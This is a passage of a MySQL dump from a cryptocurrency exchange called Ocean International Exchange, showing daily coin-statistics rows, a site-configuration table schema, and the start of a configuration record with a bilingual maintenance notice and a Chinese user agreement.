INSERT INTO `movesay_coin_json` VALUES ('1752', 'sgc', '[839532.66135,0,\"0.00000000\",\"0.00000000\"]', '', '0', '1507132799', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1753', 'sgc', '[839530.66135,0,\"0.00000000\",\"0.00000000\"]', '', '0', '1507219199', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1754', 'sgc', '[839530.66135,0,\"0.00000000\",\"0.00000000\"]', '', '0', '1507305599', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1755', 'sgc', '[839536.66135,0,\"0.00000000\",\"0.00000000\"]', '', '0', '1507391999', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1756', 'sgc', '[839536.66135,0,null,null]', '', '0', '1507478399', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1757', 'sgc', '[834532.16135,0,null,null]', '', '0', '1507564799', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1758', 'sgc', '[773225.73635,0,null,null]', '', '0', '1507651199', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1759', 'sgc', '[707306.33635,0,null,null]', '', '0', '1507737599', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1760', 'sgc', '[660956.05135,0,null,null]', '', '0', '1507823999', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1761', 'sgc', '[1131195.84135,0,null,null]', '', '0', '1507910399', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1762', 'sgc', '[1059154.25635,0,null,null]', '', '0', '1507996799', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1763', 'sgc', '[1023011.73635,0,null,null]', '', '0', '1508083199', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1764', 'sgc', '[1008962.46135,0,null,null]', '', '0', '1508169599', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1765', 'sgc', '[1057558.43635,0,null,null]', '', '0', '1508255999', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1766', 'sgc', '[1150942.28635,0,null,null]', '', '0', '1508342399', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1767', 'sgc', '[1016207.3496,0,\"0.00000000\",\"0.00000000\"]', '', '0', '1508428799', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1768', 'sgc', '[1016207.3496,0,\"0.00000000\",\"0.00000000\"]', '', '0', '1508515199', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1769', 'sgc', '[985302.1096,0,\"0.00000000\",\"0.00000000\"]', '', '0', '1508601599', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1770', 'sgc', '[985302.1096,0,\"0.00000000\",\"0.00000000\"]', '', '0', '1508687999', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1771', 'sgc', '[983755.0096,0,\"0.00000000\",\"0.00000000\"]', '', '0', '1508774399', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1772', 'sgc', '[983755.0096,0,null,null]', '', '0', '1508860799', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1773', 'sgc', '[945658.3396,0,null,null]', '', '0', '1508947199', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1774', 'sgc', '[702729.13475,0,\"0.00000000\",\"0.00000000\"]', '', '0', '1509033599', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1775', 'sgc', '[614111.6092,0,\"0.00000000\",\"0.00000000\"]', '', '0', '1509119999', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1776', 'sgc', '[665886.8542,0,\"0.00000000\",\"0.00000000\"]', '', '0', '1509206399', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1777', 'sgc', '[667098.7977,0,\"0.00000000\",\"0.00000000\"]', '', '0', '1509292799', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1778', 'sgc', '[667098.7977,0,\"0.00000000\",\"0.00000000\"]', '', '0', '1509379199', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1779', 'sgc', '[667098.7977,0,\"0.00000000\",\"0.00000000\"]', '', '0', '1509465599', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1780', 'sgc', '[667098.7977,0,\"0.00000000\",\"0.00000000\"]', '', '0', '1509551999', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1781', 'fc', '[0,0,null,null]', '', '0', '1511711999', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1782', 'fc', '[0,0,null,null]', '', '0', '1511798399', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1783', 'fc', '[0,0,null,null]', '', '0', '1511884799', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1784', 'fc', '[0,0,null,null]', '', '0', '1511971199', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1820', 'fcc', '[60748.1043,0,null,null]', '', '0', '1512057599', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1819', 'fcc', '[60748.1043,0,null,\"0.00000000\"]', '', '0', '1511971199', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1818', 'fcc', '[60748.1043,0,\"0.00000000\",null]', '', '0', '1511884799', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1821', 'fcc', '[60748.1043,0,\"0.00000000\",null]', '', '0', '1512143999', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1822', 'fcc', '[60748.1043,0,null,null]', '', '0', '1512230399', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1823', 'fcc', '[60748.1043,0,\"0.00000000\",\"0.00000000\"]', '', '0', '1512316799', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1824', 'fcc', '[60748.1043,0,\"0.00000000\",\"0.00000000\"]', '', '0', '1512403199', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1825', 'fcc', '[60748.1043,0,\"0.00000000\",\"0.00000000\"]', '', '0', '1512489599', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1827', 'pvc', '[20030.999,0,\"0.00000000\",null]', '', '0', '1511884799', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1828', 'pvc', '[20030.999,0,null,\"0.00000000\"]', '', '0', '1511971199', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1829', 'pvc', '[20030.999,0,null,null]', '', '0', '1512057599', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1830', 'pvc', '[22030.989,0,\"0.00000000\",null]', '', '0', '1512143999', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1831', 'pvc', '[22030.989,0,null,null]', '', '0', '1512230399', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1832', 'pvc', '[22806.888,0,\"0.00000000\",\"0.00000000\"]', '', '0', '1512316799', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1833', 'pvc', '[22806.888,0,\"0.00000000\",\"0.00000000\"]', '', '0', '1512403199', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1834', 'pvc', '[22806.888,0,\"0.00000000\",\"0.00000000\"]', '', '0', '1512489599', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1835', 'pvc', '[22806.888,0,\"0.00000000\",\"0.00000000\"]', '', '0', '1512575999', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1836', 'pvc', '[22806.888,0,\"0.00000000\",\"0.00000000\"]', '', '0', '1512662399', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1837', 'pvc', '[22806.888,0,\"0.00000000\",\"0.00000000\"]', '', '0', '1512748799', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1838', 'pvc', '[22806.888,0,\"0.00000000\",\"0.00000000\"]', '', '0', '1512835199', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1839', 'pvc', '[22806.888,0,\"0.00000000\",\"0.00000000\"]', '', '0', '1512921599', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1840', 'pvc', '[22806.888,0,\"0.00000000\",\"0.00000000\"]', '', '0', '1513007999', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1841', 'pvc', '[22806.888,0,\"0.00000000\",\"0.00000000\"]', '', '0', '1513094399', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1842', 'pvc', '[22806.888,0,\"0.00000000\",\"0.00000000\"]', '', '0', '1513180799', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1843', 'pvc', '[22806.888,0,\"0.00000000\",\"0.00000000\"]', '', '0', '1513267199', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1844', 'pvc', '[22806.888,0,\"0.00000000\",\"0.00000000\"]', '', '0', '1513353599', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1845', 'pvc', '[22806.888,0,\"0.00000000\",\"0.00000000\"]', '', '0', '1513439999', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1846', 'pvc', '[22806.888,0,\"0.00000000\",\"0.00000000\"]', '', '0', '1513526399', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1847', 'pvc', '[22806.888,0,\"0.00000000\",\"0.00000000\"]', '', '0', '1513612799', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1848', 'pvc', '[22806.888,0,\"0.00000000\",\"0.00000000\"]', '', '0', '1513699199', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1849', 'pvc', '[22806.888,0,\"0.00000000\",\"0.00000000\"]', '', '0', '1513785599', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1850', 'pvc', '[22806.888,0,\"0.00000000\",\"0.00000000\"]', '', '0', '1513871999', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1851', 'pvc', '[22806.888,0,\"0.00000000\",\"0.00000000\"]', '', '0', '1513958399', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1852', 'pvc', '[22806.888,0,\"0.00000000\",\"0.00000000\"]', '', '0', '1514044799', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1853', 'pvc', '[22806.888,0,\"0.00000000\",\"0.00000000\"]', '', '0', '1514131199', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1854', 'pvc', '[22806.888,0,\"0.00000000\",\"0.00000000\"]', '', '0', '1514217599', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1855', 'pvc', '[22806.888,0,\"0.00000000\",\"0.00000000\"]', '', '0', '1514303999', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1856', 'pvc', '[22806.888,0,null,null]', '', '0', '1514390399', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1857', 'pvc', '[22806.888,0,null,null]', '', '0', '1514476799', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1858', 'pvc', '[22806.888,0,null,null]', '', '0', '1514563199', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1859', 'pvc', '[22806.888,0,null,null]', '', '0', '1514649599', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1860', 'pvc', '[22806.888,0,null,null]', '', '0', '1514735999', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1861', 'pvc', '[22806.888,0,null,null]', '', '0', '1514822399', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1862', 'pvc', '[22806.888,0,null,null]', '', '0', '1514908799', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1863', 'pvc', '[22806.888,0,null,null]', '', '0', '1514995199', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1864', 'pvc', '[22806.888,0,null,null]', '', '0', '1515081599', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1865', 'pvc', '[22806.888,0,null,null]', '', '0', '1515167999', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1866', 'pvc', '[22806.888,0,null,null]', '', '0', '1515254399', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1867', 'pvc', '[22806.888,0,null,null]', '', '0', '1515340799', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1868', 'pvc', '[22806.888,0,null,null]', '', '0', '1515427199', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1869', 'pvc', '[22806.888,0,null,null]', '', '0', '1515513599', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1870', 'pvc', '[22806.888,0,null,null]', '', '0', '1515599999', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1871', 'pvc', '[22806.888,0,null,null]', '', '0', '1515686399', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1872', 'pvc', '[22806.888,0,null,null]', '', '0', '1515772799', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1873', 'pvc', '[22806.888,0,null,null]', '', '0', '1515859199', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1874', 'pvc', '[22806.888,0,null,null]', '', '0', '1515945599', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1875', 'pvc', '[22806.888,0,null,null]', '', '0', '1516031999', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1876', 'pvc', '[22806.888,0,null,null]', '', '0', '1516118399', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1877', 'pvc', '[22806.888,0,null,null]', '', '0', '1516204799', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1878', 'pvc', '[22806.888,0,null,null]', '', '0', '1516291199', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1879', 'pvc', '[22806.888,0,null,null]', '', '0', '1516377599', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1880', 'pvc', '[22806.888,0,null,null]', '', '0', '1516463999', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1881', 'pvc', '[22806.888,0,null,null]', '', '0', '1516550399', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1882', 'pvc', '[22806.888,0,null,null]', '', '0', '1516636799', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1883', 'pvc', '[22806.888,0,null,null]', '', '0', '1516723199', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1884', 'pvc', '[22806.888,0,null,null]', '', '0', '1516809599', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1885', 'pvc', '[22806.888,0,null,null]', '', '0', '1516895999', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1886', 'pvc', '[22806.888,0,null,null]', '', '0', '1516982399', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1887', 'pvc', '[22806.888,0,null,null]', '', '0', '1517068799', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1888', 'pvc', '[22806.888,0,null,null]', '', '0', '1517155199', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1889', 'pvc', '[22806.888,0,null,null]', '', '0', '1517241599', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1890', 'pvc', '[22806.888,0,null,null]', '', '0', '1517327999', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1891', 'pvc', '[22806.888,0,null,null]', '', '0', '1517414399', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1892', 'pvc', '[22806.888,0,null,null]', '', '0', '1517500799', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1893', 'pvc', '[22806.888,0,null,null]', '', '0', '1517587199', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1894', 'pvc', '[22806.888,0,\"0.00000000\",\"0.00000000\"]', '', '0', '1517673599', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1895', 'pvc', '[22806.888,0,\"0.00000000\",null]', '', '0', '1517759999', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1896', 'pvc', '[22806.888,0,\"0.00000000\",\"0.00000000\"]', '', '0', '1517846399', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1897', 'pvc', '[22806.888,0,null,null]', '', '0', '1517932799', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1898', 'pvc', '[22806.888,0,null,null]', '', '0', '1518019199', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1899', 'pvc', '[22806.888,0,null,null]', '', '0', '1518105599', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1900', 'pvc', '[22806.888,0,null,null]', '', '0', '1518191999', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1901', 'pvc', '[22806.888,0,null,null]', '', '0', '1518278399', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1902', 'pvc', '[22806.888,0,null,null]', '', '0', '1518364799', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1903', 'pvc', '[19999.998,0,null,null]', '', '0', '1518451199', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1904', 'pvc', '[35993.098,0,null,null]', '', '0', '1518537599', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1905', 'pvc', '[35975.934,0,null,null]', '', '0', '1518623999', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1906', 'pvc', '[35976.554,0,null,null]', '', '0', '1518710399', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1907', 'pvc', '[35971.3495,0,null,null]', '', '0', '1518796799', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1908', 'pvc', '[39964.4535,0,null,null]', '', '0', '1518883199', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1909', 'pvc', '[39956.1055,0,null,null]', '', '0', '1518969599', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1910', 'pvc', '[39754.86292,0,null,null]', '', '0', '1519055999', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1911', 'pvc', '[39343.82451,0,null,null]', '', '0', '1519142399', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1912', 'pvc', '[39328.38642,0,null,null]', '', '0', '1519228799', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1913', 'pvc', '[39309.71287,0,null,null]', '', '0', '1519315199', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1914', 'pvc', '[39290.40525,0,null,null]', '', '0', '1519401599', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1915', 'pvc', '[39270.20585,0,null,null]', '', '0', '1519487999', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1916', 'pvc', '[39251.5307,0,null,null]', '', '0', '1519574399', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1917', 'pvc', '[39233.59781,0,null,null]', '', '0', '1519660799', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1918', 'pvc', '[39218.73731,0,null,null]', '', '0', '1519747199', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1919', 'pvc', '[40200.31831,0,null,null]', '', '0', '1519833599', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1920', 'pvc', '[40278.35662,0,null,null]', '', '0', '1519919999', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1921', 'pvc', '[40266.02662,0,null,null]', '', '0', '1520006399', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1922', 'pvc', '[40254.80982,0,null,null]', '', '0', '1520092799', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1923', 'pvc', '[40240.55282,0,null,null]', '', '0', '1520179199', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1924', 'pvc', '[40240.55282,0,null,null]', '', '0', '1520265599', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1925', 'pvc', '[40240.55282,0,null,null]', '', '0', '1520351999', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1926', 'pvc', '[39078.41822,0,null,null]', '', '0', '1520438399', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1927', 'pvc', '[39064.96272,0,null,null]', '', '0', '1520524799', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1928', 'pvc', '[39053.65272,0,null,null]', '', '0', '1520611199', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1929', 'pvc', '[37045.81272,0,null,null]', '', '0', '1520697599', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1930', 'pvc', '[36834.182262,0,null,null]', '', '0', '1520783999', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1931', 'pvc', '[36820.780262,0,null,null]', '', '0', '1520870399', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1932', 'pvc', '[36808.910262,0,null,null]', '', '0', '1520956799', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1933', 'pvc', '[36795.908262,0,null,null]', '', '0', '1521043199', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1934', 'pvc', '[36781.928262,0,null,null]', '', '0', '1521129599', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1935', 'pvc', '[36768.638262,0,null,null]', '', '0', '1521215999', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1936', 'pvc', '[36756.408262,0,null,null]', '', '0', '1521302399', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1937', 'pvc', '[37242.859262,0,null,null]', '', '0', '1521388799', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1938', 'pvc', '[37227.359262,0,null,null]', '', '0', '1521475199', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1939', 'pvc', '[37214.349262,0,null,null]', '', '0', '1521561599', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1940', 'pvc', '[37199.149262,0,null,null]', '', '0', '1521647999', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1941', 'pvc', '[37383.979262,0,null,null]', '', '0', '1521734399', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1942', 'pvc', '[38371.079262,0,null,null]', '', '0', '1521820799', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1943', 'ppc', '[59990,0,\"0.00000000\",\"0.00000000\"]', '', '0', '1522079999', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1944', 'ppc', '[59990,0,null,null]', '', '0', '1522166399', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1945', 'ppc', '[70012.99,0,null,null]', '', '0', '1522252799', '0', '0');
INSERT INTO `movesay_coin_json` VALUES ('1946', 'ppc', '[70014.99,0,null,null]', '', '0', '1522339199', '0', '0');

-- ----------------------------
-- Table structure for `movesay_config`
-- ----------------------------
DROP TABLE IF EXISTS `movesay_config`;
CREATE TABLE `movesay_config` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `footer_logo` varchar(200) NOT NULL COMMENT ' ',
  `footer_logo_en` varchar(200) DEFAULT NULL,
  `huafei_zidong` varchar(200) NOT NULL COMMENT '名称',
  `kefu` varchar(200) NOT NULL,
  `huafei_openid` varchar(200) NOT NULL COMMENT '名称',
  `huafei_appkey` varchar(200) NOT NULL COMMENT '名称',
  `index_lejimum` varchar(200) NOT NULL COMMENT '设置',
  `login_verify` varchar(200) NOT NULL COMMENT '设置',
  `fee_meitian` varchar(200) NOT NULL COMMENT '设置',
  `top_name` varchar(200) NOT NULL COMMENT '设置',
  `web_name` varchar(200) NOT NULL,
  `web_title` varchar(200) NOT NULL,
  `web_logo` varchar(200) NOT NULL,
  `web_logo_en` varchar(200) DEFAULT NULL,
  `web_llogo_small` varchar(200) NOT NULL,
  `web_llogo_small_en` varchar(200) DEFAULT NULL,
  `web_keywords` text NOT NULL,
  `web_description` text NOT NULL,
  `web_close` text NOT NULL,
  `web_close_cause` text NOT NULL,
  `web_icp` text NOT NULL,
  `web_cnzz` text NOT NULL,
  `web_ren` text NOT NULL,
  `web_reg` text NOT NULL,
  `web_reg_en` text,
  `market_mr` text NOT NULL,
  `xnb_mr` text NOT NULL,
  `rmb_mr` text NOT NULL,
  `web_waring` text NOT NULL,
  `moble_type` text NOT NULL,
  `moble_url` text NOT NULL,
  `moble_user` text NOT NULL,
  `moble_pwd` text NOT NULL,
  `contact_moble` text NOT NULL,
  `contact_weibo` text NOT NULL,
  `contact_tqq` text NOT NULL,
  `contact_qq` text NOT NULL,
  `contact_qqun` text NOT NULL,
  `contact_weixin` text NOT NULL,
  `contact_weixin_img` text NOT NULL,
  `contact_email` text NOT NULL,
  `contact_alipay` text NOT NULL,
  `contact_alipay_img` text NOT NULL,
  `contact_bank` text NOT NULL,
  `user_truename` text NOT NULL,
  `user_moble` text NOT NULL,
  `user_alipay` text NOT NULL,
  `user_bank` text NOT NULL,
  `user_text_truename` text NOT NULL,
  `user_text_moble` text NOT NULL,
  `user_text_alipay` text NOT NULL,
  `user_text_bank` text NOT NULL,
  `user_text_log` text NOT NULL,
  `user_text_password` text NOT NULL,
  `user_text_paypassword` text NOT NULL,
  `mytx_min` text NOT NULL,
  `mytx_max` text NOT NULL,
  `mytx_bei` text NOT NULL,
  `mytx_coin` text NOT NULL,
  `mytx_fee` text NOT NULL,
  `trade_min` text NOT NULL,
  `trade_max` text NOT NULL,
  `trade_limit` text NOT NULL,
  `trade_text_log` text NOT NULL,
  `issue_ci` text NOT NULL,
  `issue_jian` text NOT NULL,
  `issue_min` text NOT NULL,
  `issue_max` text NOT NULL,
  `money_min` text NOT NULL,
  `money_max` text NOT NULL,
  `money_bei` text NOT NULL,
  `money_text_index` text NOT NULL,
  `money_text_log` text NOT NULL,
  `money_text_type` text NOT NULL,
  `invit_type` text NOT NULL,
  `invit_fee1` text NOT NULL,
  `invit_fee2` text NOT NULL,
  `invit_fee3` text NOT NULL,
  `invit_text_txt` text NOT NULL,
  `invit_text_txt_en` text,
  `invit_text_log` text NOT NULL,
  `index_notice_1` text NOT NULL,
  `index_notice_11` text NOT NULL,
  `index_notice_2` text NOT NULL,
  `index_notice_22` text NOT NULL,
  `index_notice_3` text NOT NULL,
  `index_notice_33` text NOT NULL,
  `index_notice_4` text NOT NULL,
  `index_notice_44` text NOT NULL,
  `text_footer` text NOT NULL,
  `shop_text_index` text NOT NULL,
  `shop_text_log` text NOT NULL,
  `shop_text_addr` text NOT NULL,
  `shop_text_view` text NOT NULL,
  `huafei_text_index` text NOT NULL,
  `huafei_text_log` text NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `status` int(4) NOT NULL,
  `shop_coin` varchar(200) NOT NULL COMMENT '计算方式',
  `shop_logo` varchar(200) NOT NULL COMMENT '商城LOGO',
  `shop_login` varchar(200) NOT NULL COMMENT '是否要登陆',
  `index_html` varchar(50) DEFAULT NULL,
  `trade_hangqing` varchar(50) DEFAULT NULL,
  `trade_moshi` varchar(50) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC COMMENT='系统配置表';

-- ----------------------------
-- Records of movesay_config
-- ----------------------------
INSERT INTO `movesay_config` VALUES ('1', '5ab8d0502e436.png', '5ab8d056bdc80.png', '1', 'c', '', '', '1', '1', '', 'There are risk in the market,Invest with your own risk.', 'Ocean International Exchange', 'Ocean International Exchange', '5ab89e8862f9e.png', '5ab8d02c52f03.png', '5ab8d0401e670.png', '5ab8d04898ff1.png', 'Ocean International Exchange\r\n', '', '1', '尊敬的用户：\r\n国际数字资产交易平台维护升级，升级时间预计8个小时，请您耐心等待，谢谢您的配合与支持。\r\nDear user:            International Digital Asset Trading Platform maintenance upgrade, upgrade time is expected to 8 hours please wait patiently, thank you for your cooperation and support. ', '', '', '100', '<div style=\"text-align:center;\">\r\n	<div style=\"text-align:left;\">\r\n		<span style=\"color:#337FE5;\"><span style=\"color:#337FE5;\"> \r\n		<div style=\"text-align:left;\">\r\n			<span style=\"color:#337FE5;\"><span style=\"color:#337FE5;\">用户协议<br />\r\n    国际数字资产交易平台所提供的各项服务的所有权和运作权均归国际数字资产交易平台所有。国际数字资产交易平台用户注册使用协议（以下简称“本协议”） 系由国际数字资产交易平台用户与国际数字资产交易平台就国际数字资产交易平台的各项服务所订立的相关权利义务规范。用户通过访问或使用本网站， 即表示接受并同意本协议的所有条件和条款。国际数字资产交易平台作为国际数字资产交易平台的运营者依据本协议为用户提供服务。不愿接受本协议条款的， 不得访问或使用本网站。国际数字资产交易平台有权对本协议条款进行修改，修改后的协议一旦公布即有效代替原来的协议。用户可随时查阅最新协议。<br />\r\n服务内容<br />\r\n1、国际数字资产交易平台运用自己的系统，通过互联网络等方式为用户提供的交易服务。 <br />\r\n2、用户必须自行准备如下设备和承担如下开支： <br />\r\n  ①上网设备，包括并不限于电脑或者其他上网终端、调制解调器及其他上网装置。 <br />\r\n  ②上网开支，包括并不限于网络接入费、上网设备租用费、手机流量费等。 <br />\r\n3、用户提供的注册资料，用户必须同意：<br />\r\n  ①提供中华人民共和国大陆地区合法、真实、准确、详尽的个人资料。<br />\r\n  ②如有变动，及时更新用户资料。如果用户提供的注册资料不合法、不真实、不准确、不详尽的，用户需承担因此引起的相应责任及后果， 并且保留终止用户使用国际数字资产交易平台各项服务的权利。 <br />\r\n<br />\r\n服务的提供、修改及终止<br />\r\n1、用户在接受国际数字资产交易平台各项服务的同时，同意接受国际数字资产交易平台提供的各类信息服务。 用户在此授权国际数字资产交易平台可以向其电子邮件、手机、通信地址等发送商业信息。 用户有权选择不接受国际数字资产交易平台提供的各类信息服务，并进入国际数字资产交易平台相关页面进行更改。 <br />\r\n2、国际数字资产交易平台保留随时修改或中断服务而不需通知用户的权利。国际数字资产交易平台有权行使修改或中断服务的权利， 不需对用户或任何无直接关系的第三方负责。 <br />\r\n3、用户对本协议的修改有异议，或对国际数字资产交易平台的服务不满，可以行使如下权利： <br />\r\n  ①停止使用国际数字资产交易平台的网络服务。 <br />\r\n  ②通过客服等渠道告知国际数字资产交易平台停止对其服务。 结束服务后，用户使用国际数字资产交易平台网络服务的权利立即终止。 在此情况下，国际数字资产交易平台没有义务传送任何未处理的信息或未完成的服务给用户或任何无直接关系的第三方。 <br />\r\n<br />\r\n用户信息的保密<br />\r\n1、本协议所称之国际数字资产交易平台用户信息是指符合法律、法规及相关规定，并符合下述范围的信息：<br />\r\n  